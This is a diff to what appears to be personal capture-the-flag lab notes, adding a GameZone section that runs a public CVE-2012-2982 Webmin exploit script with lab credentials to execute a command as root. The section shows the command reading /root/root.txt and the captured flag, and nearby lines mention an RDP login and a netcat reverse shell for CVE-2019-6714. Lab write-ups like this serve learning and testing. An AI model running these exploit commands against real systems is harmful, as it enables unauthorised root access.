@@ -207,6 +207,27 @@ Now since RDP is enabled we can access alfred as catwoman user (set tls-seclevel
     xfreerdp /u:"alfred\catwoman" /v:10.10.36.188 /tls-seclevel:0
 
     
-### HackPark
+## HackPark
 I created a more stable [reverse shell](HackPark/PostView.ascx) using nc to exploit CVE-2019-6714.
 
+## GameZone
+### Privilege escalation without metasploit 
+I used the Python script: https://github.com/JohnHammond/CVE-2012-2982/tree/master
+Supposing you have the SSH tunnel activated on your attacker box on localhost:10000
+
+     python CVE-2012-2982.py -t localhost -p 10000 -U agent47 -P videogamer124 -c "cat /root/root.txt > flag.txt"     
+      [+] targeting host localhost on port 10000
+      [+] successfully logged in with user 'agent47' and pw 'videogamer124'
+      [+] executed 'cat /root/root.txt > flag.txt' on 'localhost'
+
+Search for the file on the victim SSH session 
+
+    agent47@gamezone:~$ find / -name flag.txt 2>/dev/null
+      /usr/share/webmin/file/flag.txt
+Get the flag
+
+    agent47@gamezone:~$ cat /usr/share/webmin/file/flag.txt
+      a4b945830144bdd71908d12d902adeee
+
+
+    
